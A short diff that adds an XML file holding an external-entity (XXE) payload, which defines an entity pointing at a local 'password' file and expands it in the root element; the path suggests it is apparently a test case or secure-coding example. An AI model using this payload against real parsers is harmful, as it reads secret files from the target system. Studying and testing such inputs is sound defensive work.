@@ -1,0 +1,4 @@
+ <!DOCTYPE foo [  
+   <!ELEMENT foo ANY >
+   <!ENTITY xxe SYSTEM "file:C:\Users\rcs\workspace\IDS17-J\password" >]>
+   <foo>&xxe;</foo>
